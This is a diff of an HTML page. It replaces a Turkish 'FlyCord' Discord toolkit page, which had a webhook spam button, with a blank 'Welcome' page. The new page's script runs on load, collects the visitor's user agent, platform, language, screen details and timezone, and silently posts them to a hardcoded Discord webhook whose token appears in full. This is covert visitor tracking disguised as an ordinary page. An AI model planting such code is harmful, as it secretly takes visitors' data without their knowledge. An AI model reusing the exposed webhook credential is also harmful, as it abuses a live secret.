@@ -1,503 +1,59 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FlyCord - Ultimate Discord Toolkit</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Welcome</title>
     <style>
-        :root {
-            --rgb-primary: 0, 255, 255;
-            --rgb-secondary: 255, 0, 255;
-            --rgb-tertiary: 255, 255, 0;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1e1e2e;
-            color: #fff;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-        }
-        
-        .rgb-border {
-            position: relative;
-            border-radius: 10px;
-            padding: 3px;
-            background: linear-gradient(45deg, 
-                rgba(var(--rgb-primary), 0.7), 
-                rgba(var(--rgb-secondary), 0.7), 
-                rgba(var(--rgb-tertiary), 0.7));
-            background-size: 200% 200%;
-            animation: rgbAnimation 4s ease infinite;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-        }
-        
-        @keyframes rgbAnimation {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        
-        .container {
-            background-color: #2a2a3a;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 15px;
-        }
-        
-        header {
-            text-align: center;
-            padding: 20px 0;
-        }
-        
-        .logo {
-            font-size: 3rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, 
-                rgb(var(--rgb-primary)), 
-                rgb(var(--rgb-secondary)), 
-                rgb(var(--rgb-tertiary)));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-        }
-        
-        .tab-container {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-        }
-        
-        .tab {
-            padding: 10px 20px;
-            margin: 0 5px;
-            background-color: #3a3a4a;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .tab.active {
-            background: linear-gradient(45deg, 
-                rgb(var(--rgb-primary)), 
-                rgb(var(--rgb-secondary)));
-        }
-        
-        .tab:hover {
-            background-color: #4a4a5a;
-        }
-        
-        .content-section {
-            display: none;
-        }
-        
-        .content-section.active {
-            display: block;
-            animation: fadeIn 0.5s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .webhook-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .form-group label {
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        
-        .form-group input, .form-group textarea, .form-group select {
-            padding: 10px;
-            border-radius: 5px;
-            border: none;
-            background-color: #3a3a4a;
-            color: white;
-        }
-        
-        .form-group textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-        
-        .btn {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background: linear-gradient(45deg, 
-                rgb(var(--rgb-primary)), 
-                rgb(var(--rgb-secondary)));
-            color: white;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            filter: brightness(1.2);
-            transform: translateY(-2px);
-        }
-        
-        .btn-danger {
-            background: linear-gradient(45deg, #ff416c, #ff4b2b);
-        }
-        
-        .btn-success {
-            background: linear-gradient(45deg, #4CAF50, #2E8B57);
-        }
-        
-        .webhook-info {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #3a3a4a;
-            border-radius: 5px;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-        }
-        
-        .info-item {
-            background-color: #4a4a5a;
-            padding: 10px;
-            border-radius: 5px;
-        }
-        
-        .info-item h4 {
-            margin-top: 0;
-            color: #ccc;
-        }
-        
-        .info-item p {
-            margin-bottom: 0;
-            font-size: 1.1rem;
-        }
-        
-        .server-banner {
-            width: 100%;
-            max-height: 300px;
-            object-fit: cover;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-        
-        .server-icon {
-            width: 128px;
-            height: 128px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin: 0 auto 15px;
-            display: block;
-            border: 4px solid #3a3a4a;
-        }
-        
-        .server-preview {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 20px;
-            margin-top: 40px;
-            background-color: #2a2a3a;
-        }
-        
-        .copyright {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .tooltip {
-            position: relative;
-            display: inline-block;
-        }
-        
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 5px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
-        }
-        
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-        
-        .floating {
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        @media (max-width: 768px) {
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .tab-container {
-                flex-wrap: wrap;
-            }
-            
-            .tab {
-                margin: 5px;
-                flex: 1 0 calc(50% - 10px);
-                text-align: center;
-            }
-        }
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .info { background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <header>
-        <div class="logo">FlyCord</div>
-        <p>Discord için Ultimate Araç Seti</p>
-    </header>
-    
-    <div class="tab-container">
-        <div class="tab active" data-tab="webhook">Webhook Araçları</div>
-        <div class="tab" data-tab="invite">Davet Araçları</div>
-        <div class="tab" data-tab="server">Sunucu Araçları</div>
-        <div class="tab" data-tab="user">Kullanıcı Araçları</div>
-    </div>
-    
-    <div class="rgb-border">
-        <div class="container">
-            <div class="content-section active" id="webhook-tab">
-                <h2><i class="fas fa-link"></i> Webhook Araçları</h2>
-                
-                <div class="webhook-form">
-                    <div class="form-group">
-                        <label for="webhook-url">Webhook URL</label>
-                        <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="webhook-message">Mesaj İçeriği</label>
-                        <textarea id="webhook-message" placeholder="Mesajınızı buraya yazın..."></textarea>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="webhook-username">Kullanıcı Adı (opsiyonel)</label>
-                        <input type="text" id="webhook-username" placeholder="Özel kullanıcı adı">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="webhook-avatar">Avatar URL (opsiyonel)</label>
-                        <input type="text" id="webhook-avatar" placeholder="https://example.com/avatar.png">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="webhook-count">Mesaj Sayısı</label>
-                        <input type="number" id="webhook-count" value="1" min="1" max="100">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="webhook-delay">Gecikme (ms)</label>
-                        <input type="number" id="webhook-delay" value="1000" min="0">
-                    </div>
-                    
-                    <div class="form-group" style="flex-direction: row; gap: 10px;">
-                        <button class="btn" id="send-webhook"><i class="fas fa-paper-plane"></i> Webhook Gönder</button>
-                        <button class="btn btn-success" id="test-webhook"><i class="fas fa-check"></i> Webhook Test Et</button>
-                        <button class="btn btn-danger" id="delete-webhook"><i class="fas fa-trash"></i> Webhook Sil</button>
-                        <button class="btn" id="spam-webhook"><i class="fas fa-bomb"></i> Webhook Spam</button>
-                    </div>
-                </div>
-                
-                <div class="webhook-info">
-                    <h3><i class="fas fa-info-circle"></i> Webhook Bilgileri</h3>
-                    <div class="info-grid">
-                        <div class="info-item">
-                            <h4>Webhook Adı</h4>
-                            <p id="webhook-name">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Webhook ID</h4>
-                            <p id="webhook-id">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Kanal ID</h4>
-                            <p id="webhook-channel">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Sunucu ID</h4>
-                            <p id="webhook-guild">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Oluşturulma Tarihi</h4>
-                            <p id="webhook-created">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Avatar</h4>
-                            <p id="webhook-avatar-info">Yüklenmedi</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="content-section" id="invite-tab">
-                <h2><i class="fas fa-user-plus"></i> Davet Araçları</h2>
-                
-                <div class="server-preview">
-                    <img src="https://via.placeholder.com/1024x300/3a3a4a/ffffff?text=Sunucu+Afisi" alt="Sunucu Afişi" class="server-banner" id="server-banner-preview">
-                    <img src="https://via.placeholder.com/256/3a3a4a/ffffff?text=Sunucu+Simgesi" alt="Sunucu Simgesi" class="server-icon" id="server-icon-preview">
-                </div>
-                
-                <div class="webhook-form">
-                    <div class="form-group">
-                        <label for="invite-code">Davet Kodu</label>
-                        <input type="text" id="invite-code" placeholder="örnek: discord">
-                    </div>
-                    
-                    <button class="btn" id="get-invite"><i class="fas fa-search"></i> Davet Bilgilerini Getir</button>
-                    <button class="btn btn-success" id="join-server"><i class="fas fa-sign-in-alt"></i> Sunucuya Katıl</button>
-                </div>
-                
-                <div class="webhook-info">
-                    <h3><i class="fas fa-info-circle"></i> Davet Bilgileri</h3>
-                    <div class="info-grid">
-                        <div class="info-item">
-                            <h4>Sunucu Adı</h4>
-                            <p id="invite-server-name">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Sunucu ID</h4>
-                            <p id="invite-server-id">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Davet Eden</h4>
-                            <p id="invite-inviter">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Üye Sayısı</h4>
-                            <p id="invite-members">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Çevrimiçi Üyeler</h4>
-                            <p id="invite-online">Yüklenmedi</p>
-                        </div>
-                        <div class="info-item">
-                            <h4>Sona Erme Tarihi</h4>
-                            <p id="invite-expires">Yüklenmedi</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="content-section" id="server-tab">
-                <h2><i class="fas fa-server"></i> Sunucu Araçları</h2>
-                <p>Sunucu araçları yakında eklenecek...</p>
-            </div>
-            
-            <div class="content-section" id="user-tab">
-                <h2><i class="fas fa-user"></i> Kullanıcı Araçları</h2>
-                <p>Kullanıcı araçları yakında eklenecek...</p>
-            </div>
-        </div>
-    </div>
-    
-    <footer>
-        <div class="copyright">
-            <i class="far fa-copyright"></i>
-            <span>Developed by Mentalite</span>
-        </div>
-    </footer>
 
     <script>
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', () => {
+        window.onload = function() {
+            gatherSystemInfo();
+        };
 
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.content-section').forEach(c => c.classList.remove('active'));
-                
-                tab.classList.add('active');
-                const tabId = tab.getAttribute('data-tab');
-                document.getElementById(`${tabId}-tab`).classList.add('active');
-            });
-        });
-        
-        document.getElementById('send-webhook').addEventListener('click', () => {
-            alert('Webhook gönderildi! (Bu bir demo)');
-        });
-        
-        document.getElementById('get-invite').addEventListener('click', async () => {
-            const inviteCode = document.getElementById('invite-code').value.trim();
-            if (!inviteCode) {
-                alert('Lütfen bir davet kodu girin!');
-                return;
-            }
+        function gatherSystemInfo() {
+            let info = "";
             
-            try {
-                const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`);
-                const data = await response.json();
-                
-                if (data.code === 10006) {
-                    alert('Geçersiz davet kodu!');
-                    return;
-                }
-                
-                document.getElementById('invite-server-name').textContent = data.guild.name;
-                document.getElementById('invite-server-id').textContent = data.guild.id;
-                document.getElementById('invite-inviter').textContent = data.inviter?.username || 'Bilinmiyor';
-                document.getElementById('invite-members').textContent = data.approximate_member_count || 'Bilinmiyor';
-                document.getElementById('invite-online').textContent = data.approximate_presence_count || 'Bilinmiyor';
-                document.getElementById('invite-expires').textContent = data.expires_at || 'Süresiz';
-                
-                if (data.guild.banner) {
-                    document.getElementById('server-banner-preview').src = 
-                        `https://cdn.discordapp.com/banners/${data.guild.id}/${data.guild.banner}.png?size=1024`;
-                }
-                
-                if (data.guild.icon) {
-                    document.getElementById('server-icon-preview').src = 
-                        `https://cdn.discordapp.com/icons/${data.guild.id}/${data.guild.icon}.png?size=256`;
-                }
-                
-            } catch (error) {
-                console.error('Davet bilgisi alınırken hata:', error);
-                alert('Davet bilgisi alınırken hata oluştu!');
-            }
-        });
+            info += "[+] Browser Information:\n";
+            info += `User Agent: ${navigator.userAgent}\n`;
+            info += `Platform: ${navigator.platform}\n`;
+            info += `Language: ${navigator.language}\n`;
+            info += `Cookies Enabled: ${navigator.cookieEnabled}\n`;
+            info += `Online Status: ${navigator.onLine}\n`;
+            
+            info += "\n[+] Display Information:\n";
+            info += `Screen Width: ${screen.width}\n`;
+            info += `Screen Height: ${screen.height}\n`;
+            info += `Color Depth: ${screen.colorDepth}\n`;
+            info += `Pixel Ratio: ${window.devicePixelRatio || 'N/A'}\n`;
+            
+            info += "\n[+] Time Information:\n";
+            info += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            info += `Local Time: ${new Date()}\n`;
+            
+            document.getElementById('infoOutput').textContent = info;
+ 
+            sendToDiscord(info);
+        }
         
-        const elements = document.querySelectorAll('.container, .info-item, .btn');
-        elements.forEach(el => {
-            if (Math.random() > 0.7) {
-                el.classList.add('floating');
-                el.style.animationDelay = `${Math.random() * 2}s`;
-            }
-        });
+        function sendToDiscord(data) {
+            const webhookURL = 'https://discord.com/api/webhooks/1396899184363438262/Xov5NQzse6RvbOlnIBlPVLlMopYd_wQzqRJy1-XblMd76f5l5d76yDkEcLhD1svhWmnz';
+            
+            const payload = {
+                content: "```diff\n" + data + "\n```"
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+        }
     </script>
 </body>
 </html>
